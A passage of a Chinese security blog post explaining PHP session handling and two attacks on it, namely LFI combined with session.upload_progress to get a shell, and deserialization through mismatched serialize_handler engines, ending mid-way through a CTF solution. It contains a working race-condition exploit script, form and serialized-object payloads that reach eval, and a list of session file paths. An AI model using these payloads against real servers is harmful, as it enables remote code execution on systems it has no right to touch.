    <a href="/2019/07/09/php-session%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E4%BA%A7%E7%94%9F%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="article-date">
  <time datetime="2019-07-09T12:59:00.000Z" itemprop="datePublished">2019-07-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/09/php-session%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E4%BA%A7%E7%94%9F%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">php-session配置不当产生的安全问题</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="PHP中的Session机制介绍"><a href="#PHP中的Session机制介绍" class="headerlink" title="PHP中的Session机制介绍"></a>PHP中的Session机制介绍</h3><p>这里主要介绍的<code>PHPSESSIONID</code>是怎么建立起<code>session</code>与<code>cookie</code>之间的联系，以及<code>session_start()</code>函数所起的作用，看了一些文    章，在segmentfault上感觉讲的很棒，拿到引用一下</p>
<blockquote>
<p><strong>①如果session机制是基于cookie的，那么当脚本第一次运行的时候</strong><br>A、 在客户端上session_start()函数会通过setCookie()函数向Cookie中保留一个key，默认情况下Key的名字是PHPSESSID，对应的值是一个32位的、唯一的、随机的字符串！<br>B、 在服务器端，会产生一个以PHPSESSID的value值为名字的文件！其中保留的是session中的数据！同时，在脚本中创建$_SESSION超全局数组，并将session文件的数据反序列化，添加到$_SESSION数组中！</p>
<p><strong>②当脚本第二次，及以后运行的时候</strong><br>A、 浏览器端会自动携带COOKIE中的PHPSESSID对应的value值，将数据送至服务器端！<br>B、在服务器端，一旦开启sessioin_start()的时候，会根据客户端提供的sessionid去寻找对应的session文件，将session中的变量读取出来！在脚本中创建$_SESSION超全局数组，将数据定义到$_SESSION数组中！</p>
<p>注意：$_SESION数组数组只有在调用session_start()函数之后，更确切确切的说，是开启session机制之后]才会存在！之所以这样说，是由于session_start()时，会先得到session_id，通过session_id找到对应的文件内容，然后进行反序列化！如果，我们接着使用session_id()函数来滞空session_id的话，我们就找不到session中的内容了！<br>同时，$_SESSION是超全局定义数组，他和常量一样，并没有作用域的概念！几乎在哪里都可以使用！</p>
</blockquote>
<p>文档中：通过为每个独立用户分配唯一的会话 ID，可以实现针对不同用户分别存储数据的功能。 会话通常被用来在多个页面请求之间保存及共享信息。 一般来说，会话 ID 通过 cookie 的方式发送到浏览器，并且在服务器端也是通过会话 ID 来取回会话中的数据。 如果请求中不包含会话 ID 信息，那么 PHP 就会创建一个新的会话，并为新创建的会话分配新的 ID。</p>
<p>会话的工作流程很简单。当开始一个会话时，PHP 会尝试从请求中查找会话 ID （通常通过会话 cookie）， 如果请求中不包含会话 ID 信息，PHP 就会创建一个新的会话。 会话开始之后，PHP 就会将会话中的数据设置到 <a href="https://jsproxy.ga/-----https://www.php.net/manual/zh/reserved.variables.session.php" target="_blank" rel="noopener">$_SESSION</a> 变量中。 当 PHP 停止的时候，它会自动读取 <a href="https://jsproxy.ga/-----https://www.php.net/manual/zh/reserved.variables.session.php" target="_blank" rel="noopener">$_SESSION</a> 中的内容，并将其进行序列化， 然后发送给会话保存管理器来进行保存。</p>
<p>默认情况下，PHP 使用内置的文件会话保存管理器（<code>files</code>）来完成会话的保存。 也可以通过配置项 <a href="https://jsproxy.ga/-----https://www.php.net/manual/zh/session.configuration.php#ini.session.save-handler" target="_blank" rel="noopener">session.save_handler</a> 来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项 <a href="https://jsproxy.ga/-----https://www.php.net/manual/zh/session.configuration.php#ini.session.save-path" target="_blank" rel="noopener">session.save_path</a> 所指定的位置。</p>
<p>可以通过调用函数 <a href="https://jsproxy.ga/-----https://www.php.net/manual/zh/function.session-start.php" target="_blank" rel="noopener">session_start()</a> 来手动开始一个会话。 如果配置项 <a href="https://jsproxy.ga/-----https://www.php.net/manual/zh/session.configuration.php#ini.session.auto-start" target="_blank" rel="noopener">session.auto_start</a> 设置为<code>1</code>， 那么请求开始的时候，会话会自动开始。</p>
<h3 id="通过Session设置不当结合LFI进行getshell"><a href="#通过Session设置不当结合LFI进行getshell" class="headerlink" title="通过Session设置不当结合LFI进行getshell"></a>通过Session设置不当结合LFI进行getshell</h3><h4 id="原理讲解"><a href="#原理讲解" class="headerlink" title="原理讲解"></a>原理讲解</h4><p><a href="https://www.php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/session.upload-progress.php</a>官方手册描述链接</p>
<p><img src="https://s2.ax1x.com/2019/07/08/ZsEbB8.png" alt="ZsEbB8.png"></p>
<p>通过文档的描述我们可以总结出原理为：<strong>当<code>session.upload_progress.enabled</code>选项开启，PHP能够在每一个文件上传时监测上传的进度，并且我们可以在上传的同时发送一个<code>POST</code>请求到终端。当上传文件处理中，同时<code>POST</code>一个与<code>INI</code>中设置的<code>session.upload_progress.name</code>同名变量时,当PHP检测到这样的<code>POST</code>请求时，会在session中添加这样的一组数据，索引是<code>session.upload_progress.prefix</code>与<code>session.upload_progress.name</code>连接在一起的值,后面是<code>session</code>的反序列化数据</strong>，格式大概如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload_progress_lihuaiqiu|a:<span class="number">5</span>:&#123;s:<span class="number">10</span>:<span class="string">"start_time"</span>;i:<span class="number">1562585979</span>;s:<span class="number">14</span>:<span class="string">"content_length"</span>;i:<span class="number">271</span>;s:<span class="number">15</span>:<span class="string">"bytes_processed"</span>;i:<span class="number">271</span>;s:<span class="number">4</span>:<span class="string">"done"</span>;b:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"files"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">7</span>:&#123;s:<span class="number">10</span>:<span class="string">"field_name"</span>;s:<span class="number">6</span>:<span class="string">"upload"</span>;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">0</span>:<span class="string">""</span>;s:<span class="number">8</span>:<span class="string">"tmp_name"</span>;N;s:<span class="number">5</span>:<span class="string">"error"</span>;i:<span class="number">4</span>;s:<span class="number">4</span>:<span class="string">"done"</span>;b:<span class="number">1</span>;s:<span class="number">10</span>:<span class="string">"start_time"</span>;i:<span class="number">1562585979</span>;s:<span class="number">15</span>:<span class="string">"bytes_processed"</span>;i:<span class="number">0</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用需求"><a href="#利用需求" class="headerlink" title="利用需求"></a>利用需求</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled = On</span><br><span class="line">session.upload_progress.cleanup = On</span><br><span class="line">session.upload_progress.prefix = <span class="string">"upload_progress_"</span></span><br><span class="line">session.upload_progress.name = <span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span></span><br><span class="line">session.upload_progress.freq = <span class="string">"1%"</span></span><br><span class="line">session.upload_progress.min_freq = <span class="string">"1"</span></span><br></pre></td></tr></table></figure>

<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><h5 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h5><p>当可以获得目标网站的<code>phpinfo()</code>时，并且<code>phpinfo()</code>中设置如上，同时存在<code>LFI</code>漏洞，漏洞利用点就是在上传文件的同时，同时<code>POST</code>一个与<code>session.upload_progress.name</code>同名的变量，这个变量对应的值就会被记录到<code>session</code>文件中去，而这时我们的文件包含漏洞正好可以去包含这个<code>session</code>文件从而<code>getshell</code>。</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://127.0.0.1/index.php'</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">'PHPSESSID=123'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file=&#123;</span><br><span class="line">            <span class="string">"file"</span>:(<span class="string">''</span>,<span class="string">''</span>)                                                    <span class="comment">#上传无效的空文件</span></span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>:<span class="string">"&lt;?php phpinfo();?&gt;"</span>  </span><br><span class="line">        &#125;</span><br><span class="line">        r.post(url,files=file,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        event.wait()</span><br><span class="line">        t=r.get(<span class="string">"http://127.0.0.1/index.php?file=../tmp/tmp/sess_123"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'lihuaiqiu'</span> <span class="keyword">not</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            print(<span class="string">'[+]retry'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(t.text)</span><br><span class="line">            event.clear()</span><br><span class="line">event=threading.Event()</span><br><span class="line">event.set()</span><br><span class="line">threading.Thread(target=POST,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure>

<p>这里本地跑的有点慢，可能有点竞争不过<code>cleanup</code>，所以我是在本地关掉<code>cleanup</code>情况下测试的，其实效果是一样的，最终效果：</p>
<p><img src="https://s2.ax1x.com/2019/07/08/ZseAp9.png" alt="ZseAp9.png"></p>
<h5 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h5><p>其实用的是同一个原理，只不过操作不同而已，利用下面的表单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"http://127.0.0.1"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> vaule=<span class="string">"&lt;?php phpinfo(); ?&gt;"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file1"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file2"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>本地抓包不断发包。</p>
<p>在发包的同时，再抓一个文件包含的包，再次进行不断请求，最终条件竞争成功。</p>
<p>但是一定要注意在抓<code>form</code>表单时要填写自己的<code>PHPSESSID</code>(这个坑踩了好久…)，下面是成功的截图</p>
<p><img src="https://s2.ax1x.com/2019/07/09/Zsoalt.png" alt="Zsoalt.png"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>其实最终能成功<code>getshell</code>的原因就是在一个新的<code>session</code>文件,<code>session.upload_progress.prefix</code>与<code>session.upload_progress.name</code>连接在一起的值是这个文件种的索引，而<code>session.upload_progress.name</code>对应值正好就是我们<code>post</code>的，对应着exp脚本中 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">            <span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>:<span class="string">"&lt;?php phpinfo();?&gt;"</span>  </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>所以再跟着一个文件包含就可以<code>getshell</code>了。</p>
<h3 id="服务器中常见的session文件所在位置"><a href="#服务器中常见的session文件所在位置" class="headerlink" title="服务器中常见的session文件所在位置"></a>服务器中常见的session文件所在位置</h3><p>再进行<code>session</code>危险操作的时候，很多都是需要知道<code>Session</code>文件位置的，<code>Unix</code>常见的位置如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sessions/sess_PHPSESSID</span><br><span class="line"></span><br><span class="line">/<span class="keyword">var</span>/lib/php5/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php5/sessions/sess_PHPSESSID</span><br><span class="line"></span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>

<p><code>windows</code>常见的位置在与<code>www</code>同目录的<code>tmp/tmp/sess_xxx</code>。</p>
<h3 id="session-serialize-handler处理不当造成反序列化漏洞"><a href="#session-serialize-handler处理不当造成反序列化漏洞" class="headerlink" title="session.serialize_handler处理不当造成反序列化漏洞"></a><code>session.serialize_handler</code>处理不当造成反序列化漏洞</h3><p>首先还是先来看一些配置的东西</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=<span class="string">""</span>   --设置session的存储路径</span><br><span class="line">session.save_handler=<span class="string">""</span> --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.auto_start   boolen --指定会话模块是否在请求开始时启动一个会话,默认为<span class="number">0</span>不启动</span><br><span class="line">session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure>

<p>来更直观看一眼<code>phpinfo</code>中的</p>
<p><img src="https://s2.ax1x.com/2019/07/08/ZsmTPg.png" alt="ZsmTPg.png"></p>
<p><code>session.save_handler=files</code>表明<code>session</code>是以文件的方式来进行存储的(默认)，<code>session.save_handler</code>表明<code>session</code>的默认序列化引擎为<code>php</code>序列化引擎。</p>
<p>除了默认的<code>php</code>引擎，还有其他几种不同的引擎，下面来一一介绍一下：</p>
<ul>
<li>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li>
<li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li>
<li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</li>
</ul>
<p><strong><code>php_serialize</code>引擎</strong></p>
<p><img src="https://s2.ax1x.com/2019/07/08/Zslibn.png" alt="Zslibn.png"></p>
<p><strong><code>php</code>引擎</strong></p>
<p><img src="https://s2.ax1x.com/2019/07/08/Zsl7GT.png" alt="Zsl7GT.png"></p>
<p><strong><code>php_binary</code>引擎</strong></p>
<p>这里会有第一个<code>ascii</code>字符是由键名<code>chr()</code>而来的，而我这里的键名是<code>name</code>,所以真实的形式是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;0x04&gt;names:9:&quot;lihuaiqiu&quot;;</span><br></pre></td></tr></table></figure>

<p>在<code>winhex</code>中打开更明显，看一下：</p>
<p><img src="https://s2.ax1x.com/2019/07/08/ZsG779.png" alt="ZsG779.png"></p>
<h4 id="php引擎和php-serialize引擎使用不当造成的反序列化"><a href="#php引擎和php-serialize引擎使用不当造成的反序列化" class="headerlink" title="php引擎和php_serialize引擎使用不当造成的反序列化"></a><code>php</code>引擎和<code>php_serialize</code>引擎使用不当造成的反序列化</h4><p>php引擎进行序列化的结果格式如：<code>name | s:9:&quot;lihuaiqiu&quot;;</code>,键名+竖线+经过序列化后的数据。</p>
<p>php_serialize引擎序列化后的结果：经过<code>serialize()</code>函数序列化处理的值。</p>
<p>那么为什么说这两个引擎的使用不当会造成反序列化呢？</p>
<p>首先通过以下代码生成一下反序列化数据</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lihuaiqiu</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$huai=<span class="keyword">new</span> lihuaiqiu();</span><br><span class="line"><span class="keyword">echo</span> serialize($huai);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>生成后为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">9</span>:<span class="string">"lihuaiqiu"</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们此时的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'|O:9:"lihuaiqiu":0:&#123;&#125;'</span>;</span><br></pre></td></tr></table></figure>

<p>在session文件中生成的序列化数据为</p>
<p><img src="https://s2.ax1x.com/2019/07/09/Zsocfs.png" alt="Zsocfs.png"></p>
<p>但是在<code>php</code>引擎反序列化处理时，<code>|</code>会作为key与value的分隔符，所以就会把<code>a:1:{s:4:&quot;name&quot;;s:21:&quot;</code>作为key，将我们的<code>O:9:&quot;lihuaiqiu&quot;:0:{}&quot;;}</code>作为<code>value</code>，最后对<code>value</code>进行反序列化，成功获得我们构造的<code>lihuaiqiu</code>类，造成反序列化漏洞。</p>
<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>这里的代码直接借用了<code>spook</code>师傅博客里的了，稍微改了一点。</p>
<p>test1.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">"spoock"</span>]=$_GET[<span class="string">"a"</span>];</span><br></pre></td></tr></table></figure>

<p>test2.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $hi;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hi = <span class="string">'a;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;hi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用反序列化构造a的数据为<code>|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;}</code>，传入后访问test2.php，最终得到phpinfo页面成功进行反序列化。</p>
<p>下面是一个实战题目，但是在看的时候又引发了我对反序列化漏洞的很多思考，所以还是先记录一下我的思考。</p>
<p><strong>以后还是把反序列化攻击叫做属性注入攻击吧，因为简直实在真的是太贴切了。</strong></p>
<p>首先还是一道CTF题目，国赛的签到题<code>Justsoso</code>，缩减版源码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;       </span><br><span class="line">    <span class="keyword">private</span> $handle;        </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;           </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle;       </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;      </span><br><span class="line">    <span class="keyword">public</span> $file;      </span><br><span class="line">    <span class="keyword">public</span> $token;      </span><br><span class="line">    <span class="keyword">public</span> $token_flag;         </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));      </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)&#123;     </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;      </span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>);               </span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">$lihuaiqiu=unserialize($_GET[<span class="string">'payload'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于我之前写的<code>poc</code>,也来贴下吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $handle;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = &amp;<span class="keyword">$this</span>-&gt;token_flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$flag = <span class="keyword">new</span> Flag(<span class="string">"flag.php"</span>);</span><br><span class="line">$handle = <span class="keyword">new</span> Handle($flag);</span><br><span class="line"><span class="keyword">echo</span> serialize($handle).<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在看来真的是很麻烦啊，其实我只需要篡改几个属性完成攻击就行了，为什么要那么多花里胡哨的东西，精简后代码：</p>
